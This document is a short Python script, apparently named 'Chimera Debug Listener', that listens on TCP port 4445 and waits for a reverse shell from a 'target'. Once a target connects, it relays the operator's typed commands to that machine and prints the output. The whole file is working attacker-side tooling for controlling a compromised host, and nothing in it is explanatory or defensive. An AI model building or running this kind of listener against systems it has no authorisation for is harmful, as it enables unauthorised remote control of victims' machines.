#!/usr/bin/env python3
import socket, sys, os, threading

def handle_recv(s):
    while True:
        try:
            data = s.recv(4096)
            if not data: break
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()
        except: break
    print("\n[!] Connection lost.")
    os._exit(0)

print("[+] Chimera Debug Listener: Awaiting Plaintext Shell on 4445...")
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("0.0.0.0", 4445))
server.listen(1)
conn, addr = server.accept()
print(f"[!] Target connected from {addr[0]}")

# Setup the receive thread
threading.Thread(target=handle_recv, args=(conn,), daemon=True).start()

try:
    while True:
        line = sys.stdin.buffer.read1(1024)
        if not line: break
        conn.sendall(line)
except KeyboardInterrupt:
    print("\n[*] Shutting down.")
finally:
    server.close()
